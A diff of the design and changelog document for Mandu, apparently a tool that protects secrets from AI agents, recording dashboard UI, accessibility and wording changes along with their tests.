+  opens *Where your data lives* (reading it, as opening it by hand does)
+  and moves the focus to its summary; a modifier click is the browser's
+  (Home at `#home-data`). It never says anything leaked, only that others
+  *can* open the places.
+- **When.** While `/api/home` carries `openPlaces`: hidden on the first poll
+  without it, so once the modes are fixed the card goes on the next poll; a
+  failed poll leaves it as drawn. Drawn once across polls
+  (`sameAsDrawn('open-places')`). **The dashboard changes no mode**: fixing
+  them stays `mandu paths` / `mandu doctor`'s job.
+- **Where it comes from.** `/api/home` carries `openPlaces: [{ name, holds
+  }]`, absent when none: `openPlacesOf(buildDataLocations(configEnv,
+  homeOf(configEnv)))` (`src/data-locations.ts`), the same projection as
+  `/api/data-locations`, through the Home deps' `openPlaces` reader
+  (`server.ts`; absent in a test that wires none). Read on every Home read,
+  **no cache**: about 42 `stat`s, metadata only, measured at about 1.3 ms
+  for a folder where none is there (each a failed `stat`), against a
+  10-second poll. The fold's own note and badges are unchanged.
+
+Tests: `dashboard/test/unit/server/home-open-places.test.ts` (the rule over
+a fake `stat`: owner-only, the history at 0755, a developer store, a
+missing place, a place outside the folder; `buildHome` with none, no reader
+or a reader that throws), `dashboard/test/unit/ui/home-js-open-places.test.ts`
+(the headlines, the list and "and N more", the command and its Copy, See
+every place opening the fold with the focus, hidden with none, gone on the
+next poll, kept on a failed one, text only),
+`dashboard/test/component/home-open-places.test.ts` (a real server over a
+temporary `MANDU_HOME`: `events` at 0755 listed, at 0700 gone on the next
+read, the symbol database at 0644 listed; never a path, a mode or a file's
+bytes).
+
+**A broken link says what it means (2026-11-02).** When any row the list
+shows is a broken link (`exists && brokenLink`: in Mandu's folder, a
+developer place that is there, or outside the folder), a second note,
+`#home-data-broken`, under the open-places note says what it means and what
+to do, as `mandu paths` says it under its table: "1 place here is a link to
+something that is not there, so Mandu cannot use it until the link's target
+is back (a disk not mounted?) or the link is removed. Run `mandu doctor` in
+a terminal: it names each one." (plural: "2 places here are links to …, so
+Mandu cannot use them …"); the command is a `runCode`, whole with its Copy.
+Each "broken link" badge is described by that note (`aria-describedby`),
+not by a hover `title`, so mouse, touch, keyboard and screen reader get the
+same words; the "only you" / "open to others" badges keep their titles. No
+broken row, or a list that could not be loaded: the note is hidden.
+
 **Developer-only places (2026-10-19).** Sixteen rows of the path table are
 places only Mandu's own developers use (test stores, run results, CI caches,
 `dev-root`: `DEVELOPER_LOCATIONS` in `src/data-locations.ts`). On a user's
@@ -13915,7 +18667,9 @@ descriptions, the product vocabulary, `developer` and its drift guard);
 `dashboard/test/component/data-locations.test.ts` (the route over a real
 server, a developer place there and one absent);
 `dashboard/test/unit/ui/home-js-home.test.ts` (the section: developer places
-hidden or grouped, counted in the note, an older server's rows).
+hidden or grouped, counted in the note, an older server's rows; the
+broken-link note, singular and plural, its `mandu doctor`, the badge it
+describes, hidden with none and after a failed reload).
 
 #### 4.25r Keys Mandu found (was: the Suggested view)
 
@@ -13954,7 +18708,11 @@ suggestion only adds protection.
 - *One Save* sends the ticked suggestions (`POST /api/suggestions/apply
   {ids}`), then any other waiting change through the usual `files/labels`
   flow. Each suggestion becomes its own change in History
-  (`resolvePolicyProposal`). The arbiter applies one only as a pure
+  (`resolvePolicyProposal`). One saved, the notice has its Undo; several,
+  "in Approvals, under Rule changes" links the newest of them; with file
+  choices in the same Save, the notice keeps the file changes' Undo, named
+  for them ("Undo the 4 changes"), and the link (§4.25 *Every change made
+  on Rules ends with an Undo or a link*). The arbiter applies one only as a pure
   tightening of the law in force, so the weaker-change question never fires;
   a suggestion the law moved under comes back in `refused` with the
   arbiter's reason and stays waiting. Each row states its own impact ("Hides
@@ -14013,6 +18771,77 @@ Save or dismissal changes. Tests: `home-js-suggested.test.ts` (the states,
 the poll, the parts) and `tests/stack/dashboard-suggestions.test.ts` (the
 served page over a real arbiter: before a scan, after a scan of a project
 with no key, after one with a committed key).
+
+*Opened, the line names the button in sight (2026-11-01).* Opened, the card's
+Review button reads Close, yet until 2026-11-01 the line still said "Press
+Review, then Scan for keys, …", and the empty list under the scan bar said it
+again ("No suggestions. Press Scan for keys to look for keys your rules do
+not cover."). Now, with none waiting and no scan known, the opened card's line
+reads "None waiting. Press Scan for keys to look through the projects your
+agents worked in." (`suggestedLine` asks whether `#files-suggested-view` is
+shown), and the empty list's row (`drawSuggested`) reads only "No keys
+waiting.", before a scan and after one, since the line above already says
+how to look or when Mandu last looked and what it found. The row stays an
+`.empty-row` (the contrast checks read it). `setSuggestedOpen` redraws the
+line when the card opens or closes, once the suggestions were read; before
+the first read (the card reopened from the last visit) it keeps the markup's
+neutral words. The closed card's words are unchanged; the button's focus and
+`aria-expanded` are as before; the Approvals card (`suggestionWhere`) is
+untouched. Presentation only. Tests: `home-js-suggested.test.ts` (opened,
+closed again, opened after a finished scan, reopened before the first read)
+and `tests/stack/dashboard-suggestions.test.ts` (the served page opened
+before any scan).
+
+**The advice says where to replace the key (2026-10-23).** An opened row's
+advice ("This key was exposed. Replace it with a new one: …", or the softer
+form) said what to do, not where, at the moment a person most wants to act.
+Under it now sits one line per company the row's keys came from, linking
+that company's own page for its keys: "Replace it on GitHub: **Personal
+access tokens**". `SuggestionRowVM.replaceAt` is built from the row's
+content-shape detectors' `rule`, in their order, no company twice, through
+`view-model/key-pages.ts`, a display table keyed by the arbiter's
+`SHAPE_WORDS` ids (`tests/stack/key-pages-parity.test.ts` fails when an id is
+no longer the arbiter's, so a renamed detector cannot silently lose its
+link):
+
+| Rule | Line | Address |
+|---|---|---|
+| `github-token` | Replace it on GitHub: Personal access tokens | `https://github.com/settings/tokens` |
+| `gitlab-token` | Replace it on GitLab: Personal access tokens on gitlab.com, or your own GitLab's | `https://gitlab.com/-/user_settings/personal_access_tokens` |
+| `anthropic-key` | Replace it on Anthropic: API keys | `https://platform.claude.com/settings/keys` |
+| `openai-key` | If it is an OpenAI key, replace it on OpenAI: API keys | `https://platform.openai.com/api-keys` |
+| `slack-token` | Replace it on Slack: App settings | `https://api.slack.com/apps` |
+| `stripe-key` | Replace it on Stripe: API keys | `https://dashboard.stripe.com/apikeys` |
+| `google-api-key` | Replace it on Google Cloud: Credentials | `https://console.cloud.google.com/apis/credentials` |
+| `pypi-token` | Replace it on PyPI: Account settings | `https://pypi.org/manage/account/` |
+| `huggingface-token` | Replace it on Hugging Face: Access Tokens | `https://huggingface.co/settings/tokens` |
+| `aws-access-key-id`, `aws-secret-key` | Replace it on AWS: IAM console, then Security credentials under your user name | `https://console.aws.amazon.com/iam/` |
+
+Each address was checked against the company's own documentation on
+2026-10-23, and the table's header names the page checked for each, since
+no test sees a company move its page. Anthropic's documentation now names
+`platform.claude.com`, not `console.anthropic.com`; AWS's names the IAM
+console and the step after it, not a deeper address. `openai-key` reads "an
+OpenAI-style API key", a shape other services share, so its line says "If
+it is an OpenAI key". No line for `npm-token` (npm's documentation names
+the page but gives no address, and an address is not guessed), nor for
+`private-key`, `url-password`, `credential-assignment` or a catalog file
+name, which name no company. A row with no advice has no line: a label row
+(`rotate: null`), a history row the arbiter gives no advice, a model's row;
+nor does a past-sessions row, whose evidence holds key names only, never a
+detector. The links open in a new tab with `rel="noopener noreferrer"`, as
+the About Mandu links do: the Rules address can name a file (`?file=`),
+which the company's site must not receive as a referrer. Display only: no
+rule, Save, route or arbiter field changes. Tests:
+`suggestions-view-model.test.ts`, `key-pages.test.ts` (every address
+`https:`, none with a query or fragment), `home-js-suggested.test.ts` (the
+lines after the advice, `href`, `target`, `rel`), the parity test above, and
+`tests/stack/dashboard-suggestions.test.ts` (a real scan of a committed
+GitHub token serves GitHub's address; no answer carries the token). The
+Scan page reuses the table for a key that reached the AI and is in none of
+your files, with a conditional lead, "If this key is still yours, replace it
+on GitHub" ("If it is your OpenAI key, …"), since whose key it is is not
+known there (§4.25ai *A key links to where it is replaced*).
 
 **Sources.** The same row shape serves every source the arbiter files
 (`SuggestionRowVM.source`):
@@ -14142,10 +18971,17 @@ sub-menu and `#<key>` address, §4.34). Now:
   `SECTIONS` (`drawSectionLinks`). Rules: *Describe · Your rules · Who
   may get your secrets · Keys Mandu found · Built-in protections*.
   Settings: *Protection · Models · Sensitivity labels · Prompt filters ·
-  Notifications · Appearance · About* (*Appearance* since 2026-10-18,
-  *About* since 2026-10-20). Approvals (since 2026-10-23): *Keys Mandu
-  found · Rule changes asked for · Waiting · Answered earlier · Rule
-  changes*. The developer-only *Developer view* card has none. The
+  Notifications · Appearance · Dashboard account · About* (*Appearance*
+  since 2026-10-18, *About* since 2026-10-20, *Dashboard account* since
+  2026-11-04, shown only while its card is: to a browser signed in on the
+  sign-in page, §6.z). Approvals (since 2026-10-23): *Rule changes
+  asked for · Waiting · Keys Mandu found · Answered earlier · Rule
+  changes*, the lists' own order. Until 2026-10-26 *Keys Mandu found*
+  came first, so the questions an agent waits on started under a card
+  about a backlog (one machine had 276 key-like values); the keys are
+  advice and hold up nothing, so they now come after *Waiting for your
+  answer*, and `/approvals#keys-found` still opens at their card
+  (`home-js-section-links.test.ts`, stack `home-urgent-first.test.ts`). The developer-only *Developer view* card has none. The
   row wraps on a phone, a "·" ending a line rather than starting the
   next. It stays in the page's flow and never sticks, so it never covers
   the focus.
@@ -14155,7 +18991,20 @@ sub-menu and `#<key>` address, §4.34). Now:
   lists are drawn), so the row never offers a link that goes nowhere. The
   row is changed in place, never drawn again, so a poll moves neither the
   focus nor the scroll; the last link shown (`.end`) has no "·" after it.
-  Rules' and Settings' links never hide. Approvals had no row before:
+  Two more links hide with their cards: Rules' *Files made from your
+  secrets* while there are none (§4.25aa), and Settings' *Dashboard
+  account* (2026-11-04) while this browser holds no sign-in session
+  (`renderSignIn` sets the card's `hidden` from `/api/home`'s
+  `signIn.signOut`, then calls `followSectionLinks`). Until then the row
+  skipped that card, the only one with *Sign out*, and `/settings#account`
+  opened the page at its top. Now `/settings#account` in a signed-in
+  browser lands on the card: the card is hidden until Home's first read,
+  and the landing waits for that read (*Opening an address with a key*
+  below), so it finds the card shown. In a browser with no sign-in session
+  (the admin link, a server with no `signIn`) the card and its link stay
+  hidden, and the address opens Settings at its top, as a hidden
+  Approvals list's does; the key stays in the address. The other links of
+  Rules and Settings never hide. Approvals had no row before:
   *Rule changes*, which holds the only *Undo* of a rule change, came after
   Answered earlier's rows and every *Show more*, and *Waiting for your
   answer* could start under a 340 px rule-change card.
@@ -14164,7 +19013,7 @@ sub-menu and `#<key>` address, §4.34). Now:
   `#your-rules`, `#who`,
   `#keys-found`, `#built-in`; `/settings#protection`, `#models`,
   `#sensitivity-labels`, `#prompt-filters`, `#notifications`,
-  `#appearance`, `#about`. An address that opens one item of Approvals
+  `#appearance`, `#account`, `#about`. An address that opens one item of Approvals
   (`/approvals/<id>`, *Details*) wins: its hash is not read and goes from
   the address. The keys
   are not element ids, so the browser's own jump to a fragment does
@@ -14229,6 +19078,15 @@ the row showing only *Waiting* and *Answered earlier*, and
 half (`home-js-section-links.test.ts`) pins Approvals' keys and ids, a
 hidden list's link coming and going on a poll with the focus kept, a
 click, the landing after Rule changes' read, and `/approvals/<id>#…`.
+Since 2026-11-04 it also pins Settings' *Dashboard account* link: shown
+between *Appearance* and *About* with `signIn.signOut`, hidden without
+it (About keeps `.end`), shown by a poll that signs in without the row
+drawn again, and `/settings#account` landing once Home's first read
+shows the card, or opening the top when it stays hidden. The stack test
+signs a browser in on a second dashboard with an account (no admin link)
+over the same arbiter: the row reads "… Appearance · Dashboard account ·
+About" and `/settings#account` lands on the card with Sign out at both
+sizes, while the admin-link cases show no such link.
 
 **The line says which documents the label read left unchecked**
 (2026-10-08). The label read has its own budgets (`labels.limits`: 2,000
@@ -14312,8 +19170,9 @@ rescan filing nothing; and no response body holding a secret or any
 
 **Every field has the page's look (2026-10-16).** Every text box, search
 box, text area and menu the product page draws has an 8 px radius (10 px
-for *Describe what you want*), a 1 px border in `--line`, and one of the
-page's own backgrounds (`--bg`, `--panel`, or `--panel-2` for a menu that
+for *Describe what you want*), a 1 px border in `--field-line` (in
+`--line`, the dividers' color, until 2026-10-27: §4.25k *Every field's
+edge reads 3:1*), and one of the page's own backgrounds (`--bg`, `--panel`, or `--panel-2` for a menu that
 cannot be changed). Until then three had no look of their own, so the
 browser drew them: square, with its grey inset border, and a grey box in
 the dark theme. A headless Chromium over a real arbiter and dashboard read
@@ -14336,14 +19195,16 @@ Two more things changed in the same view. Its empty status line
 and a flex column does not collapse them. The list started 50 px under
 the model line, where the view's gap is 10. It now takes no margin, as
 the error line beside it already did, and the gap is 20. Not offered
-(§4.25t), the line under the menu reads "Asking a model to suggest rules
-is not offered yet: it is still being tested." (`NOT_OFFERED_LINE`). It
-was "Asking a model to suggest rules: not offered yet: asking a model is
-still being tested."
+(§4.25t), the picker's line reads "Asking a model to suggest rules is not
+offered yet: it is still being tested." (`NOT_OFFERED_LINE`). It was
+"Asking a model to suggest rules: not offered yet: asking a model is
+still being tested." Since 2026-10-31 only the API and the developer view
+read that line: the product page hides the picker while it is not offered
+(§4.25t), so the look and contrast checks below measure it offered.
 
 Tests: `test/unit/ui/css-fields-look.test.ts` (jsdom with the page's
 styles, light and dark: every field drawn on Rules and the ALLOW box on
-Approvals; the scan box against the filter box, and the model menus
+Approvals, its border in `--field-line`; the scan box against the filter box, and the model menus
 against Settings' menu; the focus rings; the view's lines without margins;
 the one-sentence line; the label's wrap on a phone),
 `suggestion-model-view-model.test.ts` (the line), and
@@ -14375,7 +19236,8 @@ protected now. Beside Settings › Models (§4.25l), on the same pattern.
 - *Save* shows the result with Undo. A change that lowers what is suggested
   (Remove, a lower level, a new "Not secret" mapping; the arbiter's
   `sensitivity-labels` delta facet) is asked about first with the Models
-  question (`modelConfirmText`).
+  question, under the row on the page (`confirmParts`; §4.25n *Settings and
+  Let it through ask on the page too*): *Save anyway* or *Remove anyway*.
 - **A change names the label as it was read** (2026-10-18). Each row
   carries its mapping's version (`version`: the listing's `itemVersions`,
   an opaque keyed hash; a label with no level yet the `absentVersion`; an
@@ -14396,6 +19258,24 @@ protected now. Beside Settings › Models (§4.25l), on the same pattern.
   rebuilt row keeps the level picked and the name typed, so its next Save
   names the mapping as it is now; a label gone from the list says so where
   the notice goes. An arbiter that sends no versions gets no change (501).
+- **Save waits for a change** (2026-10-31). On a label that has a level,
+  Save is greyed while the picker shows the level saved, and a press then
+  sends nothing (`syncLabelSave`). Until then Save was always on: a person
+  who picked a new level and moved on saw the row as before, with nothing
+  saying the level shown was not in force, and a Save at the same level
+  sent a `map` that changed nothing. Now picking another level lights Save
+  and adds a dim line under the row, "Not saved: press Save to use *Any
+  AI, when it asks*." in the picker's words; picking the saved level back
+  greys Save again and the line goes. The row drawn again under a question
+  (*Save anyway*) and the row rebuilt after a stale refusal keep the level
+  picked, so Save stays lit there. Save is greyed with `aria-disabled`, not
+  `disabled`: after a save the row is drawn at the level saved, and a
+  disabled Save would drop the focus given back to it (§4.25 *A Settings
+  row's button names its row; a change keeps the focus*) to the card's
+  heading. Remove, and Save on a label with no level yet, always send a
+  change and are unchanged. Display only: the request Save sends is the
+  same. A redraw of the list (a re-read) still draws the row from the
+  level the server reads, as before.
 
 **A row's controls fit it** (2026-10-08). A label row and a prompt filter
 row (§4.25y) end in a cell of controls: the level picker with **Save** and
@@ -14508,7 +19388,12 @@ as on the Rules line.
 **Tests.** `sensitivity-labels-view-model.test.ts`,
 `test/unit/server/sensitivity-label-routes.test.ts` (gates, the listing
 before and after a scan, map applied at once, unmap asked first, 400, 422,
-409), `test/unit/ui/home-js-labels.test.ts`. The row layout:
+409), `test/unit/ui/home-js-labels.test.ts` (Save waits for a change:
+greyed and sending nothing at the level saved, lit with the "Not saved"
+line once another level is picked, greyed again when it is picked back;
+lit on a row drawn again under a question and after a stale refusal; a
+label with no level always on). The served page's Save waits too:
+`tests/stack/label-mapping-stale.test.ts` S0. The row layout:
 `test/unit/ui/home-js-settings-rows.test.ts` (every label and prompt filter
 row kind under the page's own styles, a refusal, Models, the `app.css`
 contract) and `tests/stack/settings-rows-fit.test.ts` (a real arbiter, an
@@ -14545,7 +19430,15 @@ only, §14.11 contents). Under Scan for keys:
   **Contents (your own model)** (a model declared `local: true` reads the
   start of the documents the rules leave unprotected, including the text
   Mandu extracts from Word, Excel and PowerPoint files). Without the flag
-  every choice but Off is disabled with "not offered yet"; Contents is
+  the product page does not show the picker: the row (`#suggest-model`,
+  `hidden` in the markup), its preview and its status line stay hidden, and
+  an open preview closes, when the answer says `offered: false` or carries
+  no picker. Keys Mandu found then shows the scan bar, *More* and the list.
+  Until 2026-10-31 the row was drawn with every choice but Off disabled and
+  the line "not offered yet": a dead control, and the view's only menu, in
+  the keyboard's path. The route still sends that picker and its line
+  (`NOT_OFFERED_LINE`), which the API and the developer view read; the row
+  comes back by itself the day the server offers it. Offered, Contents is
   disabled with its reason when no local model is set up. The server builds
   the picker (`modelPickerVM`) from the flag and `modelEndpoints`.
 - *See what it would send* asks for a preview (`POST
@@ -14572,8 +19465,12 @@ wrote (the service keeps only an id and two enums per answer).
 
 **Tests.** `suggestion-model-view-model.test.ts`,
 `test/unit/server/suggestion-model-routes.test.ts`,
-`test/unit/ui/home-js-suggest-model.test.ts`, and the production adapter
-over a real arbiter in `tests/stack/policy-model-contents.test.ts`.
+`test/unit/ui/home-js-suggest-model.test.ts` (not offered, or no picker in
+the answer: the row, its preview and its line hidden, no control in them
+reachable; an open preview closes when the offer goes), and the production
+adapter over a real arbiter in `tests/stack/policy-model-contents.test.ts`.
+As shipped (no flag), `tests/stack/fields-look.test.ts` F0 and
+`tests/stack/dim-ink.test.ts` K0 serve Rules and find the picker hidden.
 
 **The preview keeps the focus (2026-10-12).** Until then, in a headless
 Chromium, Enter on *See what it would send* left the focus on `<body>`
@@ -14652,6 +19549,44 @@ key (retired by §4.25v), attributes and element ids were unchanged.
   viewer reads the same words), wherever the page showed a bare "ago".
   Compact agent rows keep the relative form. The agent page's header
   followed on 2026-10-05 (§4.25, *The header says how long it ran*).
+  - **The relative words follow the calendar (2026-10-28).** Every
+    relative moment of the product page comes from home.js `ago()`:
+    `sayWhen` (Approvals' cards and answers, a rule's origin line),
+    `agoNode` (Home's and History's "started …"/"ended …", a rule's last
+    use), Running now's "last step …", and `refreshWhen` on every poll.
+    Until then it counted days by rounding hours and never went past days:
+    a step 36 hours back, yesterday, read "2 days ago"; one 13 hours back,
+    yesterday evening, read "13 hours ago" under History's "Yesterday"; a
+    year back read "365 days ago"; and one day read "1 day ago" ("12 uses,
+    the last 1 day ago"). Now the words follow the reader's local calendar
+    and grow coarser with age, the way people say them:
+    - under an hour: "just now", "5 minutes ago";
+    - earlier today, or under 6 hours back across midnight: hours ("2
+      hours ago" for 23:30 seen at 01:30);
+    - the previous local day: "yesterday";
+    - 2 to 6 days back: "3 days ago";
+    - 7 to 29 days: whole weeks, "1 week ago", "2 weeks ago";
+    - 30 to 364 days: whole 30-day months, "1 month ago", "3 months ago";
+    - a year or more: "over a year ago".
+
+    Days are counted between local midnights, rounded, so a daylight
+    saving day of 23 or 25 hours does not shift them. So "Oct 24, 14:02 ·
+    yesterday", "12 uses, the last yesterday", "ended 3 months ago", "Sep
+    30, 2025, 14:12 · over a year ago". A month of 30 days is approximate,
+    but the words never name a date and the clock time stays beside them
+    or on hover. Each moment still keeps its words on one line
+    (`.when-ago`, `time.ago`, below). Presentation only: the callers, the
+    routes and the served data are unchanged; the inspector keeps its own
+    `ago`. Tests: unit `home-js-ago-words.test.ts` (Seoul, a fixed clock:
+    each band's edges, singular words, a 23-hour day in New York, a
+    whenNode, and a History row's moment that the poll turns from "5
+    hours ago" to "yesterday" past midnight); stack
+    `tests/stack/history-days.test.ts` (Y4: a real session ended the day
+    before reads "ended yesterday" under its "Yesterday" heading, with no
+    value on the page).
+  - **The AI plan's usage-limit warning follows it (2026-11-04).** "It
+    resets Oct 29, 06:00." in the reader's clock, the full date on hover,
+    where it said "2026-10-28 at 21:00 UTC" (§4.21 *On the product page*).
   - **A moment keeps its number with its word (2026-10-15).** Until then a
     moment's words wrapped anywhere. Headless Chromium, with a real
     arbiter, dashboard and served page, measured on every product page at
@@ -14777,6 +19712,51 @@ key (retired by §4.25v), attributes and element ids were unchanged.
       words since 2026-10-20 ("Codex wants to change a rule", "· from
       Codex in `~/blog`"), from Home's row of its session (*A rule
       change and the agent that asked*, *The card names who asked*).
+  - **Each question and rule change is a heading (2026-10-27).** The
+    cards that wait for your answer are the part of the page you must act
+    on, and a screen-reader user moves through a page by its headings (the
+    H key in NVDA and JAWS, the VoiceOver rotor). Until then a question's headline
+    ("Claude Code wants to send your secret `STRIPE_KEY` to
+    `api.stripe.com`") and a rule change's ("Claude Code wants to change a
+    rule") were plain divs. The page's heading list skipped from "Waiting
+    for your answer" to "Answered earlier", and reaching the third
+    question meant reading through the first two, cells and buttons
+    included (WCAG 2.1 SC 1.3.1 *Info and Relationships*). Nothing changes
+    on screen. Now:
+    - `askCard` draws the headline as an `<h3 class="ask-sentence">`, an
+      `<h4>` for a card under Approvals' *From sessions that have ended*,
+      whose group head is the h3 (`renderAsks` passes `grouped`). With
+      every question ended there is no group head, so the cards' headings
+      stay h3. `proposalCard` draws a rule change's headline as an h3.
+      The words and their code chips are those of the old line, and
+      `nameBy` (*A question has a name*, §4.25) names the group by the
+      heading. This holds wherever the cards are drawn: Home's short
+      cards under "Approvals waiting", Approvals under "Waiting for your
+      answer" and "Rule changes your agent asked for", and the session
+      page's *Needs your OK*. A held message's card and a program's send
+      of the files it holds are question cards too. The levels run h1,
+      h2, h3, h4 with none skipped.
+    - The headings look as the line did (app.css `.ask-sentence`: 16 px,
+      weight 500). The rule adds `margin: 0`, because mandu.css resets
+      only h1-h3, and `text-wrap-style: auto`, because app.css balances
+      h1-h3 (*No word alone on a last line*) and would rewrap a long
+      headline. A heading is a block like the div it replaces, so Home's
+      card keeps its icon beside its words (§4.25, *A short question keeps
+      its icon beside its words*).
+    - The "Mandu found N possible keys" card is neither a question nor a
+      rule change, and its line stays a div.
+    - The session page's turns and secret cards became headings the same
+      day (§4.25, *Each turn and each secret card is a heading*).
+    - Tests: `home-js-ask-headings.test.ts` (jsdom: one heading per card,
+      the one that names it, with the headline's words and its code; h4
+      under the ended group, h3 when all ended; Home and *Needs your OK*;
+      no level skipped on Home, Approvals and the session page; under the
+      page's styles, light and dark, the h3 and the h4 have the old
+      line's size, weight, colour, margin and display, unbalanced) and
+      stack `tests/stack/ask-card-headings.test.ts` (a real pending send
+      over a real arbiter and dashboard: the served Approvals and Home
+      list the headline as an h3 right under their h2, and after Block the
+      heading is gone with its card).
   - **A count keeps its word (2026-10-15).** Until then a count in the
     page's own words could end a line with its number. The same survey,
     with a probe for a number that ends a line while the next word of its
@@ -15356,8 +20336,8 @@ key (retired by §4.25v), attributes and element ids were unchanged.
     category as code and " in your message to the AI" as text (none when
     the key names no category: "a found part …" stays words), and
     `renderRules` takes `where: "prompt"` as a send: *Sending data* ("where
-    masked data and secrets may go without asking you"; this is what may
-    go to the AI), the Approvals card's icon (`FAMILY_ICON.prompt`), no
+    masked data and secrets may go, or are blocked from going, without
+    asking you", §4.25e; this is what may go to the AI), the Approvals card's icon (`FAMILY_ICON.prompt`), no
     path (so no file browser and no place in the explorer), the row's
     words as its tooltip, and the parts drawn by `ruleSubject`. An older
     server sends no parts: the subject is the chip, as before.
@@ -15410,6 +20390,33 @@ key (retired by §4.25v), attributes and element ids were unchanged.
       `tests/stack/rules-held-message-answer.test.ts` P4 (the real hold
       answered over the real route: `plain.effect` signed in and out, the
       served page's words and menu).
+  - **A held message's answer names its kind in words (2026-10-23).**
+    The entries above draw a held message's answer as its category id, a
+    code ("`pii.payment-card` in your message to the AI"), while Settings ›
+    Prompt filters, where the person chose **Ask me** for that kind, names
+    it "A card number" (`prompt-settings.ts categoryWords` / `kindName`):
+    one kind had two names. Now a kind Mandu has words for is named as
+    Settings names it: `promptAnswerWords` sends the subject "A card
+    number in your message to the AI" as one text part, and the id in
+    `plain.category`. `home.js renderRules` keeps the id in the row's
+    tooltip ("A card number in your message to the AI
+    (pii.payment-card)") and as the row's one search-only word (`find`,
+    which `ruleWords` adds), so Find a rule matches both the words and an
+    id a person wrote a rule by. An organization's own category
+    (`acme.codename`, for which `categoryWords` has no words) keeps the
+    code and today's tooltip, and a key that names no category keeps "a
+    found part …".
+    - Presentation only: the rows, their keys and ids, the reach, the
+      effect, the menu, the routes and the arbiter are unchanged. The
+      found text is never in the row.
+    - Tests: `policy-panel.test.ts` (a known kind's words, part and id,
+      an organization's category unchanged); `home-js-rules-prompt.test.ts`
+      (jsdom: the words drawn as text, the tooltip, Find by words and by
+      id); stack `tests/stack/rules-held-message-answer.test.ts` (a pack
+      pattern of category `pii.email` set to ask, answered for the
+      session over the real hold route: the panel and the served row read
+      "An email address in your message to the AI", the tooltip carries
+      `pii.email`, the address on no route).
   - **A long name breaks at its slashes (2026-10-17).** The entries
     above keep a name of at most `WHOLE_MAX` (24) characters whole and
     left a longer one as a plain code that wraps where the browser may
@@ -15470,7 +20477,9 @@ key (retired by §4.25v), attributes and element ids were unchanged.
     does now (`ruleTone`, until 2026-10-17 `sendRuleTone`): `release-block` red, `release-allow`
     green, read from the rule's kind and not its words. An expired rule
     (`expired`, "Expired, no longer used"), an audit rule and one turned
-    off decide nothing, so they keep the ring. A send rule without a menu
+    off decide nothing, so they keep the ring; so does every send rule in
+    the Secrets mode (2026-10-30, §4.25e *A send rule says when the mode
+    leaves it nothing to decide*). A send rule without a menu
     (an older server's row with no flip) draws its effect as an answer
     without one does (`.outcome` with its ✓ or ✗).
     - Unchanged: the other rows of your rules (trusted sources, a
@@ -15687,7 +20696,23 @@ key (retired by §4.25v), attributes and element ids were unchanged.
   rejected) and "placeholder" is gone. Next to prominent mentions sits
   home.js `helpButton`/`maskedHelp`: a real `<button>` with `aria-expanded`
   / `aria-controls` toggling a short note (keyboard and click, Escape and
-  click-away close; never hover-only). Its last sentence follows the
+  click-away close; never hover-only). **Every count on Home has its
+  help (2026-10-30).** The other counts of the hero's line said what they
+  count only in their link's tooltip, which a phone never shows: a secret
+  the AI read before it was marked, actions blocked, a send with a real
+  value filled in (the count most open to misreading: it reads like a
+  leak, when a rule or your OK allowed it) and a session that ran with
+  protection off each get a "?" (home.js `countHelp`: *What read before it
+  was marked means*, *What blocked means*, *What a send with a real value
+  means*, *What protection off means*) whose note is the count's meaning
+  from `COUNT_MEANINGS`, the list the session page's tiles use (§4.25 *What
+  the counts mean*). It sits after the count's link, never inside it (a
+  link cannot hold a button), in one span with it, so a phone's wrapped
+  line never starts with a lone "?". The masked count keeps its one help;
+  "waiting for you" has none. The tooltips stay as they were (the blocked
+  count's says only where it goes). Tests: `home-js-count-meanings.test.ts`
+  and the end-to-end `tests/stack/count-meanings.test.ts` (Tab from the
+  sent count's link, Enter, the note inside a 390 px window). Its last sentence follows the
   running mode so the default does not over-claim: at `secrets` (and off,
   and unknown) "only secrets are masked; untrusted content reaches the AI
   as-is"; at `full`/`injection` "In this mode, untrusted content, such as a
@@ -15700,6 +20725,109 @@ key (retired by §4.25v), attributes and element ids were unchanged.
   row: at 390 px the OpenCode row's Preview note ended at 456 px, and the
   page scrolled sideways) moves left until it ends 16 px inside the
   window, never past the 16 px left margin. Every help note gets it.
+- **A help button is a 24 px target (2026-10-28).** Every help button
+  (the "?", the *Preview* tag, an agent's warning mark, the Models form's
+  notes) was an 18 × 18 px circle, and nothing around it took a tap. On
+  Home's counts line the "?" of *What masked means* sits right after the
+  link "2 secrets masked before the AI saw them", which opens the session
+  or History. Measured in headless Chromium over a real arbiter and
+  dashboard (the first-session tour):
+
+  | width | before: button, gap to the link | after: hit area, gap to the link |
+  |---|---|---|
+  | 390 px | 18 × 18, **3 px** | 24 × 24, 3 px (the circle 6 px) |
+  | 1280 px | 18 × 18, **3 px** | 24 × 24, 3 px (the circle 6 px) |
+
+  A tap a few pixels off the "?" opened History instead of the note, under
+  WCAG 2.2's 24 px minimum (2.5.8, which §4.25 *A click on a session's row
+  opens it* holds the page to). Now the circle keeps its look, and
+  `app.css` gives `.help-btn` an invisible `::before`, 4 px past its
+  padding box (`inset: -4px`, out of the flow): a tap lands on a 24 × 24
+  px square around the circle (26 × 26 for the borderless warning mark,
+  24 px high and wider for the *Preview* tag). `.help` takes 3 px more room
+  before it (`margin-left`; a heading's help keeps its own 4 px), so that
+  square stops 3 px short of a link a space before it. No line moves: the
+  help stays an 18 px inline block, middle-aligned, and the `::before`
+  adds nothing to a line's height. Tests:
+  - jsdom `dashboard/test/unit/ui/css-help-target.test.ts`: the
+    `::before` rule and that no other rule names it (A1); every help
+    button the page draws, light and dark, at 1280 and 390 px, resolves
+    to at least 24 × 24 px (A2); the help's alignment, the circle's size
+    and the counts line's line height are as before (A3);
+  - stack `tests/stack/help-target.test.ts` (`secrets`, a real Chromium
+    over a real arbiter with the tour and a waiting question, and a real
+    dashboard): at 1280 and 390 px, the area where `elementFromPoint`
+    returns Home's "?" and *What the AI has now ?* on Approvals is at
+    least 24 × 24 px, corners included, and meets no other link or
+    button; the masked link's last pixel is still the link; a real click
+    2 px outside the circle opens the note and the page stays put; no page
+    carries the key, the tour's fake values or a token.
+
+  Both fail on the old page.
+- **The session page says "masked" and "this computer" too (2026-10-25).**
+  Its cards and step notes are built on the server (`secret-story.ts`,
+  `agent-page.ts`, `block-why.ts`), which the sweep below never read, so
+  they still said "placeholder" and "this machine" while the same page's
+  steps said "masked" and every other page "this computer". Now: "The AI
+  got only its masked version, never the real value.", "From 14:31 on the
+  AI got it masked, in 2 requests.", "An outside AI gets it masked.", "The
+  AI kept the masked version.", "A program got the masked copy of `.env`,
+  not the real file", "The request never left this computer.", "1 request
+  left this computer with your secret `STRIPE_KEY` filled in, …", "…for
